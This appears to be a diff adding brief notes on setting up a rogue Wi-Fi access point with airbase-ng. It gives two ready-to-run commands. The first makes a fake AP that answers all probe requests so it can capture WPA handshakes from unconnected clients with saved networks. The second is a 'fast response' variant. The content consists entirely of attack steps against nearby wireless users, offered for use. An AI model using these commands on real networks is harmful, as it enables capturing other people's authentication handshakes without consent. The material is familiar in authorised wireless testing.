@@ -1,0 +1,8 @@
+Set up fake access point that accepts all probes. This will capture handshakes from clients that are not connected and have
+preferred networks
+
+airbase-ng -c $channel -Z 4 -W 1 $interface
+
+Fast Response AP
+
+airbase-ng -c $channel -Z 2 -W 1 $interface
